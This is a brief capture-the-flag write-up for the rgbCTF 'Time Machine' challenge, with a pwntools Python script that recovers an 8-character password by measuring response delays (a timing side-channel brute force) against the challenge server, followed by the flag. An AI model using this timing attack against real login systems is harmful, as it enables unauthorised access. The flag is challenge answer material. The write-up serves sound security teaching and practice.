# Time Machine

Essentially has a shuffled alphabet, and uses `/dev/urandom` to pick 8 random chars from it.

Getting the first char correct causes it to sleep for 1s, the first two caused it to sleep for 2s, etc. Using this, I wrote a bruteforcer that measured response times.

```python
from pwn import *
chars = "UVWXYZAFBCDQRSTGHIJNOPKLEM"
pw = ""
import time
#p = process("./my_time_machine.elf")
p = remote("challenge.rgbsec.xyz", 13373, level='debug')
p.recvuntil(': \n')

while len(pw) < 8:
    for c in chars:
        s = time.time()
        p.sendline((pw + c).ljust(8, 'A'))
        p.recvline(timeout=9)
        e = time.time()
        p.recvline()
        if (e-s) >= len(pw)+1:
            pw += c
            print(pw)
            break
p.clean()
p.sendline(pw)
print(p.clean(timeout=10))
```

#### rgbCTF{t1m3_is-d4ng3r0us_a7fe798c89123dab}
